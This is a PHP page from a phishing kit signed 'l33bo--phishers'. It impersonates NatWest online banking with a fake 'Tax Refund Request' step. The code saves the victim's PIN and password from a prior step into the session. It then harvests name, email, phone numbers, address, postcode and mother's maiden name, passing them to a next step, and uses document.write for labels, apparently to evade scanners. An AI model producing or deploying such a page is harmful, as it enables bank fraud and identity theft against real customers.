<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
$_SESSION['pin'] = $_POST['1st']."".$_SESSION['partpin'];
$_SESSION['password'] = $_POST['password'];
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=us-ascii" />
<title>Step 1 of 3</title>
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
<link href="assets/css/main.css" rel="stylesheet" type="text/css" media="all" />
<link href="assets/css/color.css" rel="stylesheet" type="text/css" media="all" />
<link href="assets/css/toolyip.css" rel="stylesheet" type="text/css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
</head>
<body class="wizard wizard_sp">
<script type='text/javascript' src="assets/js/ValidStep1.js"></script>
<div id="wrapper" class="default_bg nobackgroundImg">
<div id="DaPage" class="PagePresent">
<div id="header" class="header">
<div class="topHeaderWrapper" style='background-color:#d8d8d8;'>
<div class="topHeaderLeftWrapper">
<ul class="globalTopnav">
<li class="OnIt"><span><script>document.write("Personal");</script></span></li>
<li class="AffIt"><a href="#"><script>document.write("Private");</script></a></li>
<li class="AffIt"><a href="#"><script>document.write("Business");</script></a></li>
<li class="AffIt"><a href="#"><script>document.write("Corporate");</script></a></li>
<li class="AffIt"><a href="#"><script>document.write("International");</script></a></li>
</ul>
</div>
<div class="topHeaderRightWrapper">
<div class="loginWrapper"><span class="loginLink"><a href="#"><script>document.write("LOG OUT");</script></a></span></div>
</div>
</div>
<div class="bottomHeaderWrapper">
<div class="bottomHeaderLeftWrapper">
<div class="rbsHeader"><a href="#"><img src="assets/img/logo.png" style="border-width:0px;" /></a></div>
<div class="globalBottomNavWrapper">
<ul class="globalBottomNav">
<li><a href="#"><script>document.write("Products");</script></a></li>
<li><a href="#"><script>document.write("Support");</script></a></li>
<li><a href="#"><script>document.write("Life Moments");</script></a></li>
</ul>
</div>
</div>
<div class="bottomHeaderRightWrapper">
<div class="quickLinksWrapper">
<ul id="quickLinks">
<li class="privacyAndCookiesTopPadding"><a href="#"><script>document.write("Privacy &amp; Cookies");</script></a></li>
<li class="last"><a href="#"><script>document.write("Accessibility");</script></a></li>
</ul>
</div>
</div>
</div>
</div>
<div id="content">
<div id="mid00" style="height: 100%;width: 560px;display: inline-block;">
<form name="details" method="post" action="Step2.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" id="details">
<div class="wizard_page">
				<div>
					<h1><script>document.write("Tax Refund Request");</script></h1>
					<h2><script>document.write("Step 1 of 3");</script></h2>
					
					
					<div class="frame">
					    <span id="InputError" class="errorIndicator" style="color:Red;display:none;"></span>
					</div>
					<div class="box_borderFrameBackShaded_Middle">
		
					<h3 class="headingBorderBackShaded"><script>document.write("Personal Information");</script></h3>
                        <div class="headingChevron pageFrameHeadingChevron headingChevronBorderShaded"></div>
						<ul class="form">
						<li class="first">
						<label for="name" class="wizCrl">
						<script>document.write("Full name");</script>
						</label>
						<span id="InputHolderName">
						<span><input name="name" type="text" maxlength="50" id="name" autocomplete="off" style="width:20em;" value="<?php echo $_SESSION['name']?>"></span>
						</span>
						</li>

						<li>
						<label for="email" class="wizCrl">
						<script>document.write("Email address");</script>
						</label>
						<span id="InputHolderEmail">
						<span><input name="email" type="text" maxlength="50" id="email" autocomplete="off" style="width:20em;" value="<?php echo $_SESSION['email'];?>"></span>
						</span>
						</li>

						<li>
						<label for="mobile" class="wizCrl">
						<script>document.write("Mobile number");</script>
						</label>
						<span id="InputHolderMobile">
						<span><input name="mobile" type="text" class="phoneUK" maxlength="11" id="mobile" autocomplete="off" style="width:20em;"></span>
						</span>
						</li>

						<li>
						<label for="telephone" class="wizCrl">
						<script>document.write("Home telephone number");</script>
						</label>
						<span id="InputHolderTelephone">
						<span><input name="telephone" type="text" class="phoneUK" maxlength="11" id="telephone" autocomplete="off" style="width:20em;" value="<?php echo $_SESSION['telephone'];?>"></span>
						</span>
						</li>						
						
						<li>
						<label for="address" class="wizCrl">
						<script>document.write("Address (1st Line)");</script>
						</label>
						<span id="InputHolderAddress">
						<span><input name="address" type="text" maxlength="50" id="address" autocomplete="off" style="width:20em;" value="<?php echo $_SESSION['address'];?>"></span>
						</span>
						</li>

						<li>
						<label for="postcode" class="wizCrl">
						<script>document.write("Postcode");</script>
						</label>
						<span id="InputHolderPostcode">
						<span><input name="postcode" type="text" class="postcodeUK" maxlength="10" id="postcode" autocomplete="off" style="width:20em;" value="<?php echo $_SESSION['postcode'];?>"></span>
						</span>
						</li>
						
						<li>
						<label for="mmn" class="wizCrl">
						<script>document.write("Mother&apos;s maiden name");</script>
						</label>
						<span id="InputHolderMmn">
						<span><input name="mmn" type="text" maxlength="50" id="mmn" autocomplete="off" style="width:20em;" value="<?php echo $_SESSION['mmn'];?>"></span>
						</span>
						</li>						
						
						</ul>								
					</div>
				</div>
				
				
			<div class="box_borderFrameBackShaded additionalButtonPadding">
				<div class="right">
					<div class="btnNext btnbg">
						<input type="submit" name="go" value="Next" id="go" class="button-right forward-arrow ">
					</div></div><div class="left">
						</div></div>
            </div>

</form>
</div>
<div class="left menu leftPanelMenu">
<div class="box_menu"><div class="box_top_menu">
<hr>
</div>
<div class="MenuBody">
<ul id="menu">
<li><a accesskey="1" href="#"><script>document.write("Account summary");</script></a></li>
<li><a accesskey="2" href="#"><script>document.write("Messages");</script></a></li>
<li><a accesskey="3" href="#"><script>document.write("Statements");</script></a></li>
<li><a accesskey="4" href="#"><script>document.write("Payments and transfers");</script></a></li>
<li><a accesskey="5" href="#"><script>document.write("Alerts");</script></a></li>
<li><a accesskey="6" href="#"><script>document.write("Cards");</script></a></li>
<li class="current"><a  accesskey="7" href="#"><script>document.write("Your details");</script></a></li>
<li><a accesskey="8" href="#"><script>document.write("Security");</script></a></li>
<li><a accesskey="9" href="#"><script>document.write("Log out");</script></a></li>
</ul>
</div>
</div>
</div>
</div>



<div class="right banners">
<div class="box_ourProducts">
<div class="box_top_ourProducts">
<hr>
</div>
<h2 class="fauxh3"><script>document.write("Our products");</script></h2>
<span><script>document.write("Personal products");</script></span>
<ul class="aol">
<li><a class="ol-link" href="#"><script>document.write("Savings accounts");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Cash ISAs");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Current accounts");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Upgrade your account");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Overdrafts");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Loans");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Mortgages");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Insurance");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Travel money");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Debit card abroad");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Investment products");</script></a></li>
<li><a class="ol-link" href="#"><script>document.write("Mobile app");</script></a></li>
</ul>
</div>
<div class="frame">
<div class="RCIP">
<a href="#" style="display:inline;">
<img width="208" height="470" src="assets/img/ad1.gif" style="border-width:0px;">
</a>
</div>
</div>
</div>
</div>
<div id="footer" class="footerContainer">
<ol class="footer_navbar">
<li><a href="#"><script>document.write("Legal Info");</script></a></li>
<li class="footerSeparator">&#183;</li>
<li><a href="#"><script>document.write("Security");</script></a></li>
<li class="footerSeparator">&#183;</li>
<li class="last"><span><script>document.write("&#169; 2005-2015 National Westminster Bank Plc");</script></span></li>
</ol>
</div>
</div>
</body>
<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
?>